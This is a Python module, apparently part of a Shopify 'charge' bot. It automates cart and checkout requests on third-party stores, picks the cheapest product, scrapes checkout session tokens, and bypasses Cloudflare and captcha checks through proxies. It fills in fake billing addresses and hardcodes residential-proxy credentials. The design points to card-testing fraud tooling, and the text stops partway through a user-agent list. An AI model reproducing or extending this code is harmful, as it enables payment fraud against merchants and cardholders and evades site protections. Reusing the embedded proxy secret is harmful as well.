from time import sleep
import asyncio
import re
import base64
import json
import time
from urllib.parse import urlparse, urljoin
import random
import html
from datetime import datetime, timezone, timedelta
import uuid
import logging
import hashlib
from typing import Optional

from BOT.Charge.Shopify.tls_session import TLSAsyncSession
from BOT.Charge.Shopify.bulletproof_session import BulletproofSession

# Import captcha solver
try:
    from BOT.helper.shopify_captcha_solver import (
        ShopifyCaptchaSolver,
        generate_bypass_data,
        BrowserFingerprint,
        MotionDataGenerator,
    )
    CAPTCHA_SOLVER_AVAILABLE = True
except ImportError:
    CAPTCHA_SOLVER_AVAILABLE = False

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

# Configure logging
logger = logging.getLogger(__name__)

# Low-product details API (Silver-bullet style): returns variant, pricing, location, checkout URLs
LOW_PRODUCT_API_BASE = "https://shopify-api-new-production.up.railway.app"
LOW_PRODUCT_API_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
}


def _log_output_to_terminal(output: dict) -> None:
    """No-op: logging is done in single.py per check_one to avoid spam."""
    pass


def get_proxy():
    host, port, user, password = "ipv6-residential-bridge.bytezero.io", "1111", "0gzKNdn7m1-country-US", "8%2HUKRlNsR1"
    return f"http://{user}:{password}@{host}:{port}"

async def check_ip_with_proxy():
    proxy = get_proxy()
    async with TLSAsyncSession(proxy=proxy) as client:
        res = await client.get("https://api.ipify.org?format=json")
        print("With Proxy:", res.json())


C2C = {
    "USD": "US",
    "CAD": "CA",
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "CHF": "CH",
}

book = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586", "currencyCode": "USD"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198", "currencyCode": "CAD"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123", "currencyCode": "USD"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210", "currencyCode": "USD"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567", "currencyCode": "USD"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555", "currencyCode": "USD"},
    "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345", "currencyCode": "USD"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345", "currencyCode": "USD"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567", "currencyCode": "USD"},
    "SI": {"address1": "Slovenska cesta 50", "city": "Ljubljana", "postalCode": "1000", "zoneCode": "LJ", "countryCode": "SI", "phone": "38621984156", "currencyCode": "USD"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586", "currencyCode": "USD"},
}


def pick_addr(url, cc=None, rc=None):

    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()

    if tcn in book:
        return book[tcn]

    ccn = C2C.get(cc)

    if rc in book and ccn == rc:
        return book[rc]
    elif rc in book:
        return book[rc]
    return book["DEFAULT"]

def capture(data, first, last):
  """Extract text between first and last markers. Returns None if not found or data is None."""
  if not data or not isinstance(data, str):
      return None
  try:
      start = data.index(first) + len(first)
      end = data.index(last, start)
      return data[start:end]
  except (ValueError, AttributeError, TypeError):
      return None


# ========== SESSION TOKEN PARSING (old working api.py patterns first) ==========
# Old api.py: capture(text, 'serialized-session-token" content="&quot;', '&quot') - tiefossi.com
# User format: <meta name="serialized-sessionToken" content="&quot;TOKEN&quot;"/>
# stickerdad.com may use shop.app or store checkout with different encoding
SESSION_TOKEN_PREFIX = '<meta name="serialized-sessionToken" content="&quot;'
SESSION_TOKEN_SUFFIX = '&quot;"/>'

# Old working capture patterns (try first - matches tiefossi.com and similar)
SESSION_TOKEN_CAPTURE_PAIRS = [
    ('serialized-session-token" content="&quot;', '&quot'),       # old api.py - tiefossi
    ('serialized-session-token" content="&quot;', '&quot;'),       # variant
    ('serialized-sessionToken" content="&quot;', '&quot;"/>'),     # user format
    ('serialized-sessionToken" content="&quot;', '&quot;'),        # stickerdad/shop.app
    ('<meta name="serialized-sessionToken" content="&quot;', '&quot;"/>'),
    ('<meta name="serialized-session-token" content="&quot;', '&quot;"/>'),
    ('name="serialized-sessionToken" content="&quot;', '&quot;"/>'),
    ('name="serialized-session-token" content="&quot;', '&quot'),  # old hyphen
]

SESSION_TOKEN_PATTERNS = [
    (r'<meta\s+name="serialized-session-token"\s+content="&quot;([^&]+)&quot;"', 'meta_hyphen'),  # old api
    (r'<meta\s+name="serialized-sessionToken"\s+content="&quot;([^&]+)&quot;"\s*/?>', 'meta_standard'),
    (r'<meta\s+content="&quot;([^&]+)&quot;"\s+name="serialized-sessionToken"\s*/?>', 'meta_reversed'),
    (r'"serializedSessionToken"\s*:\s*"((?:[^"\\]|\\.)*)"', 'json_script'),
    (r"name='serialized-sessionToken'\s+content='&quot;([^&]+)&quot;'", 'meta_single_quote'),
    (r'name="serialized-sessionToken"\s+content="([^"]+)"', 'meta_plain'),
    (r'serialized-session-token["\']?\s*content\s*=\s*["\']&quot;([^&]+)&quot;', 'inline_hyphen'),
    (r'serializedSessionToken["\']?\s*:\s*["\']((?:[^"\\]|\\.)*)["\']', 'json_camel'),
]

def _extract_jwt_from_text(text: str) -> Optional[str]:
    """Extract JWT (xxx.yyy.zzz) from text - session tokens are often JWTs."""
    if not text or len(text) < 50:
        return None
    m = re.search(r'eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}', text)
    if m:
        tok = m.group(0)
        if 50 < len(tok) < 2000:
            return tok
    return None


def _extract_session_token(checkout_text: str) -> Optional[str]:
    """
    Extract x_checkout_one_session_token. Old api.py patterns first for tiefossi.com compatibility.
    """
    if not checkout_text or not isinstance(checkout_text, str):
        return None
    # Old working capture patterns first (same as api.py)
    for prefix, suffix in SESSION_TOKEN_CAPTURE_PAIRS:
        try:
            v = capture(checkout_text, prefix, suffix)
            if v and isinstance(v, str) and len(v.strip()) > 10:
                return v.strip()
        except Exception:
            continue
    # Regex patterns
    for pattern, name in SESSION_TOKEN_PATTERNS:
        try:
            match = re.search(pattern, checkout_text, re.IGNORECASE | re.DOTALL)
            if match:
                token = (match.group(1) or "").strip()
                if len(token) > 10:
                    logger.debug(f"Session token found via {name}")
                    return token
        except Exception:
            continue
    # Canonical prefix/suffix
    v = capture(checkout_text, SESSION_TOKEN_PREFIX, SESSION_TOKEN_SUFFIX)
    if not v or not isinstance(v, str):
        v = capture(checkout_text, SESSION_TOKEN_PREFIX, '&quot;" />')
    if not v and SESSION_TOKEN_PREFIX.startswith("<meta "):
        alt_prefix = 'name="serialized-sessionToken" content="&quot;'
        v = capture(checkout_text, alt_prefix, SESSION_TOKEN_SUFFIX) or capture(checkout_text, alt_prefix, '&quot;" />')
    # Capture fallbacks
    if not v:
        for prefix, suffix in [
            ('<meta name="serialized-sessionToken" content="&quot;', '&quot;"/>'),
            ('<meta name="serialized-sessionToken" content="&quot;', '&quot;" />'),
            ('name="serialized-sessionToken" content="&quot;', '&quot;"/>'),
            ('name="serialized-sessionToken" content="&quot;', '&quot;" />'),
            ('<meta name="serialized-session-token" content="&quot;', '&quot;"/>'),
            ('"serializedSessionToken":"', '"'),
            ("'serializedSessionToken':'", "'"),
        ]:
            try:
                v = capture(checkout_text, prefix, suffix)
                if v and isinstance(v, str) and len(v.strip()) > 10:
                    return v.strip()
            except Exception:
                continue
    if v and isinstance(v, str):
        v = v.strip()
        if len(v) > 10:
            return v
    # Last resort: JWT in page (session tokens are JWTs)
    jwt_tok = _extract_jwt_from_text(checkout_text)
    if jwt_tok:
        return jwt_tok
    return None


def _capture_multi(data: str, *pairs) -> Optional[str]:
    """Try multiple (first, last) patterns; return first non-empty match."""
    if not data:
        return None
    for first, last in pairs:
        try:
            v = capture(data, first, last)
            if v and str(v).strip():
                return v.strip()
        except Exception:
            pass
    return None


def _extract_running_total_and_currency(checkout_text: str) -> tuple:
    """Extract amount and currency from runningTotal/checkoutTotal in checkout page. Returns (amount_str, currency_code) or (None, None)."""
    if not checkout_text:
        return (None, None)
    # Try runningTotal first (HTML-encoded)
    m = re.search(
        r'runningTotal&quot;:\s*\{[^}]*&quot;amount&quot;:\s*&quot;([0-9]+(?:\.[0-9]+)?)&quot;[^}]*&quot;currencyCode&quot;:\s*&quot;([A-Z]{3})&quot;',
        checkout_text,
    )
    if m:
        return (m.group(1), m.group(2))
    # runningTotal JSON
    m = re.search(
        r'runningTotal["\']:\s*\{[^}]*"amount"\s*:\s*"([0-9]+(?:\.[0-9]+)?)"[^}]*"currencyCode"\s*:\s*"([A-Z]{3})"',
        checkout_text,
    )
    if m:
        return (m.group(1), m.group(2))
    # checkoutTotal (HTML-encoded)
    m = re.search(
        r'checkoutTotal&quot;:\s*\{[^}]*&quot;amount&quot;:\s*&quot;([0-9]+(?:\.[0-9]+)?)&quot;[^}]*&quot;currencyCode&quot;:\s*&quot;([A-Z]{3})&quot;',
        checkout_text,
    )
    if m:
        return (m.group(1), m.group(2))
    # Nested value.amount pattern (common in Shopify checkout)
    m = re.search(
        r'&quot;value&quot;:\s*\{[^}]*&quot;amount&quot;:\s*&quot;([0-9]+(?:\.[0-9]+)?)&quot;[^}]*&quot;currencyCode&quot;:\s*&quot;([A-Z]{3})&quot;',
        checkout_text,
    )
    if m:
        return (m.group(1), m.group(2))
    # presentmentCurrency + amount nearby
    m = re.search(
        r'&quot;amount&quot;:\s*&quot;([0-9]+(?:\.[0-9]+)?)&quot;[^}]{0,200}&quot;currencyCode&quot;:\s*&quot;([A-Z]{3})&quot;',
        checkout_text,
    )
    if m:
        return (m.group(1), m.group(2))
    return (None, None)


def _get_checkout_url_from_cart_response(response_data: dict) -> Optional[str]:
    """Extract checkoutUrl from cart create GraphQL response. Handles multiple response shapes."""
    if not response_data or not isinstance(response_data, dict):
        return None
    data = response_data.get("data") or {}
    if not data:
        return None
    # Alias result:cartCreate -> result
    for key in ("result", "cartCreate"):
        node = data.get(key)
        if not isinstance(node, dict):
            continue
        cart = node.get("cart")
        if isinstance(cart, dict):
            url = cart.get("checkoutUrl")
            if url and isinstance(url, str) and url.startswith("http"):
                return url
    return None

def _products_from_json_text(text: str):
    """Parse products from raw /products.json text. Returns (product_id, price) or raises ValueError."""
    if not text or not text.strip():
        raise ValueError("SITE_EMPTY_RESPONSE")
    t = text.strip()
    if t.startswith("<!") or t.startswith("<html") or t.startswith("<HTML"):
        if any(x in t.lower() for x in ["captcha", "hcaptcha", "recaptcha", "challenge", "verify"]):
            raise ValueError("SITE_CAPTCHA_BLOCK")
        raise ValueError("SITE_HTML_ERROR")
    try:
        response_data = json.loads(t)
    except json.JSONDecodeError as e:
        if "Expecting value" in str(e):
            raise ValueError("SITE_EMPTY_JSON")
        raise ValueError("SITE_INVALID_JSON")
    if "products" not in response_data:
        raise ValueError("SITE_NO_PRODUCTS_KEY")
    products_data = response_data["products"]
    if not products_data:
        raise ValueError("SITE_PRODUCTS_EMPTY")
    products = {}
    for product in products_data:
        try:
            variants = product.get("variants", [])
            if not variants:
                continue
            variant = variants[0]
            product_id = variant.get("id")
            available = variant.get("available", False)
            price_str = variant.get("price", "0")
            price = float(price_str) if price_str else 0.0
            if price < 0.1:
                continue
            if available and product_id:
                products[product_id] = price
        except (KeyError, ValueError, TypeError):
            continue
    if products:
        min_id = min(products, key=products.get)
        return min_id, products[min_id]
    raise ValueError("SITE_PRODUCTS_EMPTY")


def _first_product_handle_from_json_text(text: str) -> Optional[str]:
    """Parse first product handle from /products.json text. Returns handle or None."""
    if not text or not text.strip() or text.strip().startswith("<"):
        return None
    try:
        data = json.loads(text)
        products_list = data.get("products") if isinstance(data, dict) else None
        if not products_list or not isinstance(products_list, list):
            return None
        for p in products_list:
            if not isinstance(p, dict):
                continue
            handle = p.get("handle")
            if handle and isinstance(handle, str) and handle.strip():
                return handle.strip()
        return None
    except (json.JSONDecodeError, TypeError):
        return None


def _parse_low_product_api_response(text: str) -> Optional[dict]:
    """
    Parse low-product API JSON response. Returns dict with variantid, price, requires_shipping,
    formatted_price, currency_code, currency_symbol, country_code, price1 (from formatted_price)
    or None on failure. Matches Silver-bullet parsing patterns.
    """
    if not text or not text.strip():
        return None
    t = text.strip()
    if t.startswith("<!") or t.startswith("<html") or t.startswith("<HTML"):
        return None
    try:
        data = json.loads(t)
    except json.JSONDecodeError:
        return None
    if not isinstance(data, dict) or not data.get("success"):
        return None
    variant = data.get("variant")
    pricing = data.get("pricing")
    location = data.get("location")
    if not isinstance(variant, dict):
        return None
    variant_id = variant.get("id")
    if variant_id is None:
        return None
    try:
        variant_id = int(variant_id)
    except (TypeError, ValueError):
        return None
    requires_shipping = variant.get("requires_shipping", False)
    price_val = None
    currency_code = ""
    currency_symbol = ""
    formatted_price = ""
    country_code = ""
    if isinstance(pricing, dict):
        price_val = pricing.get("price")
        if price_val is not None:
            try:
                price_val = float(price_val)
            except (TypeError, ValueError):
                price_val = None
        currency_code = (pricing.get("currency_code") or "")
        currency_symbol = (pricing.get("currency_symbol") or "")
        formatted_price = (pricing.get("formatted_price") or "")
    if isinstance(location, dict):
        country_code = (location.get("country_code") or "")
    price1 = (formatted_price.lstrip("$").strip() or None) if formatted_price else None
    checkout = data.get("checkout")
    direct_url = ""
    cart_add_url = ""
    if isinstance(checkout, dict):
        direct_url = (checkout.get("direct_url") or "").strip()
        cart_add_url = (checkout.get("cart_add_url") or "").strip()
        if direct_url and not direct_url.startswith("http"):
            direct_url = ""
        if cart_add_url and not cart_add_url.startswith("http"):
            cart_add_url = ""
    return {
        "variantid": variant_id,
        "price": price_val if price_val is not None else 0.0,
        "requires_shipping": requires_shipping,
        "formatted_price": formatted_price,
        "currency_code": currency_code,
        "currency_symbol": currency_symbol,
        "country_code": country_code,
        "price1": price1 or formatted_price,
        "direct_url": direct_url,
        "cart_add_url": cart_add_url,
    }


async def _fetch_low_product_api(domain: str, session, proxy: Optional[str] = None) -> Optional[dict]:
    """
    GET low-product API for domain (e.g. stickerdad.com). Bulletproof headers, retries, domain variants.
    Returns parsed dict (variantid, price, ...) or None.
    """
    if not domain or not str(domain).strip():
        return None
    domain = str(domain).strip().lower()
    if "://" in domain:
        domain = urlparse(domain).netloc or domain
    # Try domain as-is, then with/without www (API may expect either)
    domains_to_try = [domain]
    if domain.startswith("www."):
        domains_to_try.append(domain[4:])
    else:
        domains_to_try.append("www." + domain)
    for _domain in domains_to_try:
        for attempt in range(2):
            try:
                api_url = f"{LOW_PRODUCT_API_BASE}/{_domain}"
                resp = await session.get(
                    api_url,
                    headers=dict(LOW_PRODUCT_API_HEADERS),
                    timeout=25,
                    follow_redirects=True,
                )
                if not resp or getattr(resp, "status_code", 0) != 200:
                    if attempt < 1:
                        await asyncio.sleep(1.0)
                    continue
                text = (getattr(resp, "text", None) or "").strip()
                result = _parse_low_product_api_response(text)
                if result:
                    logger.info(f"✅ Low-product API success for {_domain}")
                    return result
            except Exception as e:
                logger.debug(f"Low-product API fetch failed for {_domain} attempt {attempt}: {e}")
                if attempt < 1:
                    await asyncio.sleep(1.0)
    # Fallback: try direct (no proxy) in case proxy blocks Railway API
    try:
        import httpx
        for _domain in domains_to_try:
            try:
                api_url = f"{LOW_PRODUCT_API_BASE}/{_domain}"
                async with httpx.AsyncClient(timeout=20.0, follow_redirects=True) as client:
                    resp = await client.get(api_url, headers=dict(LOW_PRODUCT_API_HEADERS))
                    if resp.status_code == 200 and resp.text:
                        result = _parse_low_product_api_response(resp.text.strip())
                        if result:
                            logger.info(f"✅ Low-product API via direct (no proxy) for {_domain}")
                            return result
            except Exception as e:
                logger.debug(f"Low-product API direct fetch failed for {_domain}: {e}")
    except ImportError:
        pass
    return None


def _fetch_products_cloudscraper_sync(url: str, proxy: Optional[str] = None):
    """Fetch /products.json via cloudscraper (captcha bypass). Returns (product_id, price) or raises."""
    if not HAS_CLOUDSCRAPER:
        raise ValueError("SITE_CAPTCHA_BLOCK")
    u = url.rstrip("/").split("?")[0]
    fetch_url = f"{u}/products.json?limit=100"
    scraper = cloudscraper.create_scraper(browser={"browser": "chrome", "platform": "windows", "mobile": False})
    proxies = {"http": proxy, "https": proxy} if proxy and str(proxy).strip() else None
    r = scraper.get(fetch_url, timeout=20, proxies=proxies)
    if r.status_code != 200:
        raise ValueError(f"SITE_HTTP_{r.status_code}")
    return _products_from_json_text(r.text or "")


def _fetch_checkout_cloudscraper_sync(checkout_url: str, proxy: Optional[str] = None):
    """Fetch checkout page via cloudscraper (captcha bypass). Returns (status_code, text)."""
    if not HAS_CLOUDSCRAPER:
        return (0, "")
    scraper = cloudscraper.create_scraper(browser={"browser": "chrome", "platform": "windows", "mobile": False})
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = scraper.get(
            checkout_url,
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            },
            timeout=18,
            proxies=proxies,
        )
        return (r.status_code, r.text or "")
    except Exception:
        return (0, "")


def _fetch_checkout_via_cloudscraper_full_flow_sync(
    url: str, product_id: int, proxy: Optional[str] = None
) -> tuple[int, str, str]:
    """
    Full checkout flow via cloudscraper: cart/add.js -> POST checkout -> return (status, text, final_url).
    Used when regular session gets Cloudflare block (stickerdad, tiefossi).
    Retries on 429 (rate limit) with backoff.
    """
    if not HAS_CLOUDSCRAPER:
        return (0, "", "")
    import time
    base = url.rstrip("/")
    scraper = cloudscraper.create_scraper(browser={"browser": "chrome", "platform": "windows", "mobile": False})
    proxies = {"http": proxy, "https": proxy} if proxy else None
    for attempt in range(3):
        try:
            add_r = scraper.post(
                f"{base}/cart/add.js",
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Content-Type": "application/json",
                    "Accept": "*/*",
                    "Origin": base,
                    "Referer": base + "/",
                },
                json={"items": [{"id": product_id, "quantity": 1}]},
                timeout=12,
                proxies=proxies,
            )
            if add_r.status_code == 429 and attempt < 2:
                time.sleep(2.0 + attempt * 1.0)
                continue
            if add_r.status_code != 200:
                return (add_r.status_code, "", "")
            time.sleep(0.5)
            ch_r = scraper.post(
                f"{base}/checkout",
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Referer": f"{base}/cart",
                    "Origin": base,
                },
                data={"updates[]": "1", "note": "", "checkout": ""},
                timeout=25,
                allow_redirects=True,
                proxies=proxies,
            )
            if ch_r.status_code == 429 and attempt < 2:
                time.sleep(2.0 + attempt * 1.0)
                continue
            final_url = ch_r.url if hasattr(ch_r, "url") else ""
            return (ch_r.status_code, ch_r.text or "", final_url)
        except Exception:
            if attempt < 2:
                time.sleep(1.0 + attempt)
                continue
            return (0, "", "")
    return (0, "", "")


def _fetch_store_page_cloudscraper_sync(store_url: str, proxy: Optional[str] = None):
    """Fetch store page via cloudscraper (captcha bypass). Returns (status_code, text)."""
    if not HAS_CLOUDSCRAPER:
        return (0, "")
    scraper = cloudscraper.create_scraper(browser={"browser": "chrome", "platform": "windows", "mobile": False})
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = scraper.get(
            store_url,
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            },
            timeout=20,
            proxies=proxies,
        )
        return (r.status_code, r.text or "")
    except Exception:
        return (0, "")


def _extract_checkout_tokens_robust(checkout_text: str) -> dict:
    """
    Bulletproof extraction of checkout tokens from Shopify checkout HTML.
    Returns dict with keys: session_token, source_token, queue_token, stable_id.
    Uses meta tags (any attribute order), JSON in script, and HTML-entity encoded patterns.
    """
    out = {"session_token": None, "source_token": None, "queue_token": None, "stable_id": None}
    if not checkout_text or not isinstance(checkout_text, str):
        return out
    text = checkout_text

    # Session token: enhanced multi-pattern parser
    out["session_token"] = _extract_session_token(text)
    if not out["session_token"]:
        out["session_token"] = _extract_jwt_from_text(text)

    # Source token: old api.py pattern first - capture(text, 'serialized-source-token" content="&quot;', '&quot')
    out["source_token"] = _capture_multi(
        text,
        ('serialized-source-token" content="&quot;', '&quot'),       # old api.py - tiefossi
        ('serialized-source-token" content="&quot;', '&quot;'),       # variant
        ('serialized-sourceToken" content="&quot;', '&quot;"/>'),
        ('serialized-sourceToken" content="&quot;', '&quot;'),        # stickerdad/shop.app
        ('<meta name="serialized-sourceToken" content="&quot;', '&quot;"/>'),
        ('name="serialized-sourceToken" content="&quot;', '&quot;"/>'),
        ('name="serialized-source-token" content="&quot;', '&quot'),  # old hyphen
    )
    if not out["source_token"] and ("serialized-sourceToken" in text or "serialized-source-token" in text):
        for pat in [
            r'name\s*=\s*["\']serialized-sourceToken["\'][^>]*?content\s*=\s*["\']&quot;(.+?)&quot;\s*"\s*/\s*>',
            r'name\s*=\s*["\']serialized-sourceToken["\'][^>]*?content\s*=\s*&quot;(.+?)&quot;\s*"\s*/\s*>',
            r'content\s*=\s*["\']&quot;(.+?)&quot;\s*"\s*/\s*>[^<]*name\s*=\s*["\']serialized-sourceToken["\']',
        ]:
            m = re.search(pat, text, re.I | re.DOTALL)
            if m:
                v = m.group(1).strip()
                if v and len(v) > 10:
                    out["source_token"] = v
                    break
        if not out["source_token"]:
            out["source_token"] = _capture_multi(
                text,
                ('name="serialized-sourceToken" content="&quot;', '&quot;"/>'),
                ('name="serialized-sourceToken" content="&quot;', '&quot;" />'),
                ('serialized-sourceToken" content="&quot;', '&quot;"/>'),
                ('serialized-source-token" content="&quot;', '&quot'),
                ('serialized-source-token" content="', '"'),
                ('name="serialized-source-token" content="', '"'),
                ("name='serialized-source-token' content='", "'"),
            )
    if not out["source_token"]:
        for name_pat, content_pat in [
            (r'name=["\']serialized-source-token["\'][^>]+content=["\']([^"\']+)["\']', r'content=["\']([^"\']+)["\'][^>]+name=["\']serialized-source-token["\']'),
            (r'content="([^"]+)"[^>]+name="serialized-source-token"', None),
        ]:
            m = re.search(name_pat, text, re.I | re.DOTALL)
            if m:
                v = m.group(1).strip()
                if v and len(v) > 10:
                    out["source_token"] = v
                    break
            if content_pat:
                m = re.search(content_pat, text, re.I | re.DOTALL)
                if m:
                    v = m.group(1).strip()
                    if v and len(v) > 10:
                        out["source_token"] = v
                        break
    if not out["source_token"] and "serializedSourceToken" in text:
        m = re.search(r'"serializedSourceToken"\s*:\s*"((?:[^"\\]|\\.)*)"', text)
        if m:
            out["source_token"] = m.group(1).replace("\\\"", '"').strip()
    if not out["source_token"]:
        m = re.search(r'"sourceToken"\s*:\s*"((?:[^"\\]|\\.)*)"', text)
        if m:
            out["source_token"] = m.group(1).replace("\\\"", '"').strip()
    if not out["source_token"]:
        m = re.search(r"'sourceToken'\s*:\s*'([^']+)'", text)
        if m:
            out["source_token"] = m.group(1).strip()
    # Source token from URL path in page (e.g. /checkouts/cn/TOKEN/ or redirect URL)
    if not out["source_token"]:
        m = re.search(r'/cn/([a-zA-Z0-9_-]{20,})', text)
        if m:
            v = m.group(1).strip()
            if v and len(v) > 15:
                out["source_token"] = v
    if out["source_token"] and isinstance(out["source_token"], str):
        out["source_token"] = out["source_token"].strip() or None
    if out["source_token"] and len(out["source_token"]) < 10:
        out["source_token"] = None

    # Queue token: old api.py uses capture(text, "queueToken&quot;:&quot;", "&quot")
    if not out["queue_token"]:
        out["queue_token"] = _capture_multi(
            text,
            ('queueToken&quot;:&quot;', '&quot'),   # old api.py
            ('queueToken&quot;:&quot;', '&quot;'),
            ('queueToken":"', '"'),
            ('"queueToken":"', '"'),
        ) or capture(text, "queueToken&quot;:&quot;", "&quot")
    if not out["queue_token"]:
        m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', text)
        if m:
            out["queue_token"] = m.group(1)
        if not out["queue_token"]:
            m = re.search(r"'queueToken'\s*:\s*'([^']+)'", text)
            if m:
                out["queue_token"] = m.group(1)
        if not out["queue_token"]:
            m = re.search(r'"queueToken"\s*:\s*"((?:[^"\\]|\\.)*)"', text)
            if m:
                out["queue_token"] = m.group(1).replace("\\\"", '"').strip()
    if out["queue_token"] and isinstance(out["queue_token"], str):
        out["queue_token"] = out["queue_token"].strip() or None

    # Stable ID: old api.py uses capture(text, "stableId&quot;:&quot;", "&quot")
    if not out["stable_id"]:
        out["stable_id"] = _capture_multi(
            text,
            ('stableId&quot;:&quot;', '&quot'),   # old api.py
            ('stableId&quot;:&quot;', '&quot;'),
            ('stableId":"', '"'),
            ('"stableId":"', '"'),
        ) or capture(text, "stableId&quot;:&quot;", "&quot")
    if not out["stable_id"]:
        m = re.search(r'"stableId"\s*:\s*"([^"]+)"', text)
        if m:
            out["stable_id"] = m.group(1)
        if not out["stable_id"]:
            m = re.search(r"'stableId'\s*:\s*'([^']+)'", text)
            if m:
                out["stable_id"] = m.group(1)
        if not out["stable_id"]:
            m = re.search(r'stableId["\']?\s*:\s*["\']([^"\']+)["\']', text)
            if m:
                out["stable_id"] = m.group(1).strip()
        if not out["stable_id"]:
            m = re.search(r'stableId&quot;:&quot;([^&]+)&quot;', text)
            if m:
                out["stable_id"] = m.group(1).strip()
    if out["stable_id"] and isinstance(out["stable_id"], str):
        out["stable_id"] = out["stable_id"].strip() or None

    # Deep fallback: extract from JSON blobs anywhere in page (stickerdad.com, shop.app)
    if not all([out["session_token"], out["source_token"], out["queue_token"], out["stable_id"]]):
        deep = _extract_tokens_from_page_json(checkout_text)
        if not out["session_token"] and deep.get("session_token"):
            out["session_token"] = deep["session_token"]
        if not out["source_token"] and deep.get("source_token"):
            out["source_token"] = deep["source_token"]
        if not out["queue_token"] and deep.get("queue_token"):
            out["queue_token"] = deep["queue_token"]
        if not out["stable_id"] and deep.get("stable_id"):
            out["stable_id"] = deep["stable_id"]

    return out


def _extract_tokens_from_page_json(text: str) -> dict:
    """
    Extract tokens from JSON blobs embedded in checkout page (stickerdad, tiefossi, shop.app).
    Searches for script tags, inline JSON, and HTML-entity encoded structures.
    """
    out = {"session_token": None, "source_token": None, "queue_token": None, "stable_id": None}
    if not text or len(text) < 100:
        return out
    # Patterns for JSON-embedded tokens (handle escaped quotes in values)
    json_patterns = [
        (r'"serializedSessionToken"\s*:\s*"((?:[^"\\]|\\.)*)"', "session_token", 10),
        (r'"sessionToken"\s*:\s*"((?:[^"\\]|\\.)*)"', "session_token", 10),
        (r'"session_token"\s*:\s*"((?:[^"\\]|\\.)*)"', "session_token", 10),
        (r'sessionToken["\']?\s*:\s*["\']([^"\']{15,})["\']', "session_token", 10),
        (r'"serializedSourceToken"\s*:\s*"((?:[^"\\]|\\.)*)"', "source_token", 8),
        (r'"sourceToken"\s*:\s*"((?:[^"\\]|\\.)*)"', "source_token", 8),
        (r'"queueToken"\s*:\s*"((?:[^"\\]|\\.)*)"', "queue_token", 3),
        (r'"stableId"\s*:\s*"((?:[^"\\]|\\.)*)"', "stable_id", 3),
        (r'queueToken&quot;:&quot;([^&]+)&quot;', "queue_token", 3),
        (r'stableId&quot;:&quot;([^&]+)&quot;', "stable_id", 3),
        (r'"queueToken"\s*:\s*"([^"]+)"', "queue_token", 3),
        (r'"stableId"\s*:\s*"([^"]+)"', "stable_id", 3),
    ]
    for pattern, key, min_len in json_patterns:
        try:
            m = re.search(pattern, text, re.DOTALL)
            if m:
                v = (m.group(1) or "").replace('\\"', '"').strip()
                if v and len(v) >= min_len and not out.get(key):
                    out[key] = v
        except Exception:
            pass
    return out


def get_product_id(response):
    """
    Extract the lowest priced available product from /products.json response.
    Returns (product_id, price) tuple or raises ValueError with descriptive message.
    """
    if not response or not response.text:
        raise ValueError("SITE_EMPTY_RESPONSE")
    return _products_from_json_text(response.text)


USER_AGENTS = [
    # --- Android ---
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6312.107 Mobile Safari/537.36",
